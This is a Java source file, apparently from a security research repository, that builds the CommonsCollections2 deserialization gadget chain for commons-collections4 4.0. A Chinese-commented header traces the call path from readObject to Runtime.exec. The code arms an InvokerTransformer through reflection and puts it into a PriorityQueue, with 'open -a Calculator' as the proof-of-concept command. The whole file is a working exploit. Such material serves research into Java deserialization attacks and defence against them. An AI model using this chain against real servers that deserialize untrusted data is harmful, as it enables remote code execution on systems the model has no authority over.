package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.Gadgets;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;

/**
 * CommonsCollections2 的 gadget
 * 测试环境 JDK8u45
 *
 * 	Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			PriorityQueue.readObject()
 * 				...
 * 					TransformingComparator.compare()
 * 						InvokerTransformer.transform()
 * 							Method.invoke()
 * 								Runtime.exec()
 */
@Dependencies({ "org.apache.commons:commons-collections4:4.0" })
public class CC2 {
    public static void main(String[] args) throws  Exception{
        final Object templates = Gadgets.createTemplatesImpl("open -a Calculator");
        // mock method name until armed
        final org.apache.commons.collections4.functors.InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;
        PayloadRunner.run(queue);

    }
}
